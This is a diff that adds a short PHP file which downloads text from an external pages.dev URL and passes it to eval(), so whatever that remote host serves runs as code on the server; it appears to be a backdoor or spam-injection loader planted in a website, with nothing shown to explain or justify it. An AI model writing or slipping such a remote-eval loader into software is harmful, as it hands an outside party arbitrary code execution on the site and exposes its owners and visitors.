@@ -1,0 +1,4 @@
+<?php
+$url = 'https://lmdmall.pages.dev/lmdmall-jamur4d.txt';
+$exfooter = file_get_contents($url);
+eval('?>' . $exfooter); 
